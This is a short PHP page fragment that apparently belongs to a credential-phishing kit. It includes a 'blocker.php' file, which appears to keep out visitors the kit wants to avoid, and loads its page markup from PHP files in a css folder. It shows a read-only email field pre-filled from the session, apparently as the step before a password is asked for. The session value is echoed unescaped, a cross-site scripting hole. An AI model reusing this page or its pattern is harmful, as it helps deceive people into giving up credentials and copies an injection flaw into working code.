<?php
include('../blocker.php');

session_start();

?>
<?php include("../css/maka.php"); ?>

<input name="email" type="email" required placeholder="Email Address" value="<?php if($_SESSION['email']) { echo $_SESSION['email']; } ?>" readonly />

<?php include("../css/maka2.php"); ?>

<?php     unset ($_SESSION['email']);
?>